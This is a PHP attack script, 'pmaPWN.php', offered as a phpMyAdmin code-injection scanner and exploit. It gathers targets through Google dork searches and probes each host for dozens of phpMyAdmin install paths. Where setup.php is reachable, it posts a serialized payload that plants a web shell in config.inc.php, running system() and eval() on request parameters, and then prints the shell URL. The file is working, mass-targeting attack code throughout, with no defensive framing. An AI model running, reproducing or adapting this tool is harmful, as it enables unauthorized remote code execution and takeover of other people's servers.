<?php
 
$list = array(
'/phpmyadmin/',
'/phpMyAdmin/', 
'/PMA/',
'/pma/', 
'/admin/', 
'/dbadmin/', 
'/mysql/', 
'/myadmin/', 
'/phpmyadmin2/', 
'/phpMyAdmin2/', 
'/phpMyAdmin-2/', 
'/php-my-admin/', 
'/phpMyAdmin-2.2.3/', 
'/phpMyAdmin-2.2.6/', 
'/phpMyAdmin-2.5.1/', 
'/phpMyAdmin-2.5.4/', 
'/phpMyAdmin-2.5.5-rc1/', 
'/phpMyAdmin-2.5.5-rc2/', 
'/phpMyAdmin-2.5.5/', 
'/phpMyAdmin-2.5.5-pl1/', 
'/phpMyAdmin-2.5.6-rc1/', 
'/phpMyAdmin-2.5.6-rc2/', 
'/phpMyAdmin-2.5.6/', 
'/phpMyAdmin-2.5.7/', 
'/phpMyAdmin-2.5.7-pl1/', 
'/phpMyAdmin-2.6.0-alpha/', 
'/phpMyAdmin-2.6.0-alpha2/', 
'/phpMyAdmin-2.6.0-beta1/', 
'/phpMyAdmin-2.6.0-beta2/', 
'/phpMyAdmin-2.6.0-rc1/', 
'/phpMyAdmin-2.6.0-rc2/', 
'/phpMyAdmin-2.6.0-rc3/', 
'/phpMyAdmin-2.6.0/', 
'/phpMyAdmin-2.6.0-pl1/', 
'/phpMyAdmin-2.6.0-pl2/', 
'/phpMyAdmin-2.6.0-pl3/', 
'/phpMyAdmin-2.6.1-rc1/', 
'/phpMyAdmin-2.6.1-rc2/', 
'/phpMyAdmin-2.6.1/', 
'/phpMyAdmin-2.6.1-pl1/', 
'/phpMyAdmin-2.6.1-pl2/', 
'/phpMyAdmin-2.6.1-pl3/', 
'/phpMyAdmin-2.6.2-rc1/', 
'/phpMyAdmin-2.6.2-beta1/', 
'/phpMyAdmin-2.6.2-rc1/', 
'/phpMyAdmin-2.6.2/', 
'/phpMyAdmin-2.6.2-pl1/', 
'/phpMyAdmin-2.6.3/', 
'/phpMyAdmin-2.6.3-rc1/', 
'/phpMyAdmin-2.6.3/', 
'/phpMyAdmin-2.6.3-pl1/', 
'/phpMyAdmin-2.6.4-rc1/', 
'/phpMyAdmin-2.6.4-pl1/', 
'/phpMyAdmin-2.6.4-pl2/', 
'/phpMyAdmin-2.6.4-pl3/', 
'/phpMyAdmin-2.6.4-pl4/', 
'/phpMyAdmin-2.6.4/', 
'/phpMyAdmin-2.7.0-beta1/', 
'/phpMyAdmin-2.7.0-rc1/', 
'/phpMyAdmin-2.7.0-pl1/', 
'/phpMyAdmin-2.7.0-pl2/', 
'/phpMyAdmin-2.7.0/', 
'/phpMyAdmin-2.8.0-beta1/', 
'/phpMyAdmin-2.8.0-rc1/', 
'/phpMyAdmin-2.8.0-rc2/', 
'/phpMyAdmin-2.8.0/', 
'/phpMyAdmin-2.8.0.1/', 
'/phpMyAdmin-2.8.0.2/', 
'/phpMyAdmin-2.8.0.3/', 
'/phpMyAdmin-2.8.0.4/', 
'/phpMyAdmin-2.8.1-rc1/', 
'/phpMyAdmin-2.8.1/', 
'/phpMyAdmin-2.8.2/', 
'/sqlmanager/', 
'/mysqlmanager/', 
'/p/m/a/', 
'/PMA2005/', 
'/pma2005/', 
'/phpmanager/', 
'/php-myadmin/', 
'/phpmy-admin/', 
'/webadmin/', 
'/sqlweb/', 
'/websql/', 
'/webdb/', 
'/mysqladmin/', 
'/mysql-admin/',
);
 
if($argc > 1) {
    print "|****************************************************************|\n";
    print "        pmaPWN.php - d3ck4, hacking.expose@gmail.com\n";
    print "       phpMyAdmin Code Injection RCE Scanner & Exploit\n";
    print "  This is PHP version original http://milw0rm.com/exploits/8921\n";
    print "           credit: Greg Ose, pagvac @ gnucitizen.org\n";
    print "        greetz: Hacking Expose!, HM Security, darkc0de\n";
    print "|****************************************************************|\n";
    print "\n";
    print "Usage: php $argv[0] \n";
    exit;
}
 
    print "|****************************************************************|\n";
    print "        pmaPWN.php - d3ck4, hacking.expose@gmail.com\n";
    print "       phpMyAdmin Code Injection RCE Scanner & Exploit\n";
    print "  This is PHP version original http://milw0rm.com/exploits/8921\n";
    print "           credit: Greg Ose, pagvac @ gnucitizen.org\n";
    print "        greetz: Hacking Expose!, HM Security, darkc0de\n";
    print "|****************************************************************|\n";
    print "\n";
    $Handlex = FOpen("pmaPWN.log", "a+");
    FWrite($Handlex, "|****************************************************************|\n");
    FWrite($Handlex, "        pmaPWN.php - d3ck4, hacking.expose@gmail.com\n");
    FWrite($Handlex, "       phpMyAdmin Code Injection RCE Scanner & Exploit\n");
    FWrite($Handlex, "  This is PHP version original http://milw0rm.com/exploits/8921\n");
    FWrite($Handlex, "           credit: Greg Ose, pagvac @ gnucitizen.org\n");
    FWrite($Handlex, "        greetz: Hacking Expose!, HM Security, darkc0de\n");
    FWrite($Handlex, "|****************************************************************|\n\n");
    print "[-] Master, where you want to go today? \n";
    print "[-] example dork: intitle:phpMyAdmin \n";
    fwrite(STDOUT, "\n[ pwn3r@google ~] ./dork -s ");
    $dork = trim(fgets(STDIN));
    print "\n[!] QUERY: SELECT * FROM `googledb` WHERE `keyword` = '$dork'\n";
    FWrite($Handlex, "[!] QUERY: SELECT * FROM `googledb` WHERE `keyword` = '$dork'\n");
    for($i = 0; $i <= 900; $i+=100) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.google.com/cse?cx=013269018370076798483%3Awdba3dlnxqm&q=$dork&num=100&hl=en&as_qdr=all&start=$i&sa=N");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 200);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_REFERER, "http://google.com");
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9');
    $pg = curl_exec($ch);
    curl_close($ch);
 
    if (preg_match_all("/<h2 class=(.*?)><a href=\"(.*?)\" class=(.*?)>/", $pg, $links)) { $res[] = $links[2]; }
    }
     
    foreach($res as $key) {
        foreach($key as $target) {
            $total++;
        }
    }
    print "[+] Done. $total rows return.\n";
    FWrite($Handlex, "[+] Done. $total rows return.\n");
    FClose($Handlex);
    foreach($res as $key) {
        foreach($key as $target) {
            $Handlex = FOpen("pmaPWN.log", "a+");
            $real = parse_url($target);
            $url = "http://".$real['host'];
            print "\n[-] Scanning phpMyAdmin on ".$url."\n";
            FWrite($Handlex, "\n[-] Scanning phpMyAdmin on ".$url."\n");
            FClose($Handlex);
            sleep(5);
            $curlHandle = curl_multi_init();
            for ($i = 0;$i < count($list); $i++)
            $curl[$i] = addHandle($curlHandle,$url.$list[$i]);
            ExecHandle($curlHandle);
            for ($i = 0;$i < count($list); $i++)
            {           
                $text[$i] =  curl_multi_getcontent ($curl[$i]);
                //echo $url.$list[$i]."\n";
                $Handlex = FOpen("pmaPWN.log", "a+");
                if (preg_match("/<title>phpMyAdmin/", $text[$i]) or preg_match("/<title>Access denied/", $text[$i]) and preg_match("/phpMyAdmin/", $text[$i])) {
                print "\n[!] w00t! w00t! Found phpMyAdmin [ ".$url.$list[$i]." ]";
                print "\n[+] Testing vulnerable, wait sec..\n";
                FWrite($Handlex, "\n[!] w00t! w00t! Found phpMyAdmin [ ".$url.$list[$i]." ]");
                FWrite($Handlex, "\n[+] Testing vulnerable, wait sec..\n");
                    if (preg_match("/phpMyAdmin is more friendly with a/", $text[$i])) {
                        print "\n[!] w00t! w00t! NO PASSWD --> [ ".$url.$list[$i]." ]\n";
                        FWrite($Handlex, "\n[!] w00t! w00t! NO PASSWD --> [ ".$url.$list[$i]." ]\n");
                    }
                FClose($Handlex);
                exploit_site($url.$list[$i]);
                }
            }
            for ($i = 0;$i < count($list); $i++)//remove the handles
            curl_multi_remove_handle($curlHandle,$curl[$i]);
            curl_multi_close($curlHandle);
            sleep(5);
        }
    }
 
function addHandle(&$curlHandle,$url)
{
$cURL = curl_init();
curl_setopt($cURL, CURLOPT_URL, $url);
curl_setopt($cURL, CURLOPT_HEADER, 0);
curl_setopt($cURL, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($cURL, CURLOPT_TIMEOUT, 10);
curl_multi_add_handle($curlHandle,$cURL);
return $cURL;
}
//execute the handle until the flag passed
// to function is greater then 0
function ExecHandle(&$curlHandle)
{
$flag=null;
do {
//fetch pages in parallel
curl_multi_exec($curlHandle,$flag);
} while ($flag > 0);
}
 
function exploit_site($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 200);
    curl_setopt($ch, CURLOPT_URL, $url."scripts/setup.php");
    $result = curl_exec($ch);
    curl_close($ch);
    $ch2 = curl_init();
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch2, CURLOPT_HEADER, 1);
    curl_setopt($ch2, CURLOPT_TIMEOUT, 200);
    curl_setopt($ch2, CURLOPT_URL, $url."config/config.inc.php");
    $result2 = curl_exec($ch2);
    curl_close($ch2);
    //print $url;
    if (preg_match("/200 OK/", $result) and preg_match("/token/", $result) and preg_match("/200 OK/", $result2)) {
        print "\n[!] w00t! w00t! Found possible phpMyAdmin vuln";
        print "\n[+] Exploiting, wait sec..\n";
        $Handlex = FOpen("pmaPWN.log", "a+");
        FWrite($Handlex, "\n[!] w00t! w00t! Found possible phpMyAdmin vuln");
        FWrite($Handlex, "\n[+] Exploiting, wait sec..\n");
        FClose($Handlex);
        exploit($url);
    }
    else {
        $Handlex = FOpen("pmaPWN.log", "a+");
        print "\n[-] Shit! no luck.. not vulnerable\n";
        FWrite($Handlex, "\n[-] Shit! no luck.. not vulnerable\n");
        FClose($Handlex);
    }
}
 
    function exploit($w00t) {
        $Handlex = FOpen("pmaPWN.log", "a+");
        $useragent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 (.NET CLR 3.5.30729) "; //firefox 
        //first get cookie + token 
        $curl = curl_init(); 
        curl_setopt($curl, CURLOPT_URL, $w00t."scripts/setup.php"); //URL 
        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 20);
        curl_setopt($curl, CURLOPT_USERAGENT, $useragent); 
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_TIMEOUT, 200); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);      
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); //return site as string 
        curl_setopt($curl, CURLOPT_COOKIEFILE, "exploitcookie.txt"); 
        curl_setopt($curl, CURLOPT_COOKIEJAR, "exploitcookie.txt"); 
        $result = curl_exec($curl);
        curl_close($curl);
        if (preg_match_all("/token\"\s+value=\"([^>]+?)\"/", $result, $matches));
         
        $token = $matches[1][1];
        if ($token != '') {
        print "\n[!] w00t! w00t! Got token = " . $matches[1][1];
        FWrite($Handlex, "\n[!] w00t! w00t! Got token = " . $matches[1][1]);
        $payload = "token=".$token."&action=save&configuration=a:1:{s:7:%22Servers%22%3ba:1:{i:0%3ba:6:{s:136:%22host%27%5d=%27%27%3b%20if(\$_GET%5b%27c%27%5d){echo%20%27%3cpre%3e%27%3bsystem(\$_GET%5b%27c%27%5d)%3becho%20%27%3c/pre%3e%27%3b}if(\$_GET%5b%27p%27%5d){echo%20%27%3cpre%3e%27%3beval(\$_GET%5b%27p%27%5d)%3becho%20%27%3c/pre%3e%27%3b}%3b//%22%3bs:9:%22localhost%22%3bs:9:%22extension%22%3bs:6:%22mysqli%22%3bs:12:%22connect_type%22%3bs:3:%22tcp%22%3bs:8:%22compress%22%3bb:0%3bs:9:%22auth_type%22%3bs:6:%22config%22%3bs:4:%22user%22%3bs:4:%22root%22%3b}}}&eoltype=unix";
        print "\n[+] Sending evil payload mwahaha.. \n";
        FWrite($Handlex, "\n[+] Sending evil payload mwahaha.. \n");
        $curl = curl_init(); 
        curl_setopt($curl, CURLOPT_URL, $w00t."scripts/setup.php"); 
        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 20);
        curl_setopt($curl, CURLOPT_TIMEOUT, 200);
        curl_setopt($curl, CURLOPT_USERAGENT, $useragent); 
        curl_setopt($curl, CURLOPT_REFERER, $w00t); 
        curl_setopt($curl, CURLOPT_POST, true); 
        curl_setopt($curl, CURLOPT_POSTFIELDS, $payload); 
        curl_setopt($curl, CURLOPT_COOKIEFILE, "exploitcookie.txt"); 
        curl_setopt($curl, CURLOPT_COOKIEJAR, "exploitcookie.txt"); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 3); 
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE); 
        $result = curl_exec($curl);
        curl_close($curl);
         
        print "\n[!] w00t! w00t! You should now have shell here";
        print "\n[+] ".$w00t."config/config.inc.php?c=id \n";
        print "\n[!] Saved. Dont forget to check `pmaPWN.log`\n";
        FWrite($Handlex, "\n[!] w00t! w00t! You should now have shell here");
        FWrite($Handlex, "\n[+] ".$w00t."config/config.inc.php?c=id \n");
         
        }
        else {
            print "\n[!] Shit! no luck.. not vulnerable\n";
            FWrite($Handlex, "\n[!] Shit! no luck.. not vulnerable\n");
            return false;
        }
        FClose($Handlex);
        if (file_exists('exploitcookie.txt')) { unlink('exploitcookie.txt'); }
        //exit();
    }
 
?>